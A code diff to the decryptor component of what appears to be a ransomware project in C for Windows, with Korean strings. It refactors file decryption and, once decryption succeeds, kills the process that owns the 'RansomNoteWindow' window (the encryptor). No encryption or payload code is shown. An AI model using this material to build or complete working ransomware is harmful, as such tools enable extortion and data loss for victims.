@@ -1,6 +1,8 @@
+// main_decryptor.c
 #include <windows.h>
 #include <stdio.h>
 #include "decryptor.h"
+#include "walker.h"
 
 #define AES_KEY_SIZE 32
 #define IV_SIZE 16
@@ -8,53 +10,29 @@
 
 HINSTANCE hInst;
 
-// 복호화 함수
 void do_decrypt(HWND hwnd) {
-    unsigned char aes_key[AES_KEY_SIZE];
-    unsigned char iv[IV_SIZE];
+    int count = decrypt_all_files();
+    if (count > 0) {
+        MessageBoxA(hwnd, "복호화 완료!", "성공", MB_ICONINFORMATION);
 
-    restore_key(aes_key);
-    restore_iv(iv);
-
-    WIN32_FIND_DATAA fd;
-    HANDLE hFind = FindFirstFileA("*.adr", &fd);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        int success = 0;
-        do {
-            if (decrypt_file(fd.cFileName, aes_key, iv)) {
-                success++;
-            }
-        } while (FindNextFileA(hFind, &fd));
-        FindClose(hFind);
-
-        if (success > 0) {
-            MessageBoxA(hwnd, "복호화 완료!", "성공", MB_ICONINFORMATION);
-
-            // 랜섬노트 창 닫기 → encryptor.exe 종료
-            HWND ransomWnd = FindWindowA("RansomNoteWindow", NULL);
-            if (ransomWnd) {
-                DWORD pid = 0;
-                GetWindowThreadProcessId(ransomWnd, &pid);
-                if (pid != 0) {
-                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
-                    if (hProc) {
-                        TerminateProcess(hProc, 0);
-                        CloseHandle(hProc);
-                    }
+        HWND ransomWnd = FindWindowA("RansomNoteWindow", NULL);
+        if (ransomWnd) {
+            DWORD pid = 0;
+            GetWindowThreadProcessId(ransomWnd, &pid);
+            if (pid != 0) {
+                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+                if (hProc) {
+                    TerminateProcess(hProc, 0);
+                    CloseHandle(hProc);
                 }
             }
-
-        }
-        else {
-            MessageBoxA(hwnd, "복호화 실패!", "실패", MB_ICONERROR);
         }
     }
     else {
-        MessageBoxA(hwnd, "복호화할 .adr 파일이 없습니다.", "오류", MB_ICONERROR);
+        MessageBoxA(hwnd, "복호화할 파일이 없습니다.", "실패", MB_ICONERROR);
     }
 }
 
-// 윈도우 프로시저
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
     case WM_CREATE:
@@ -79,7 +57,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return 0;
 }
 
-// WinMain 진입점
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nCmdShow) {
     hInst = hInstance;
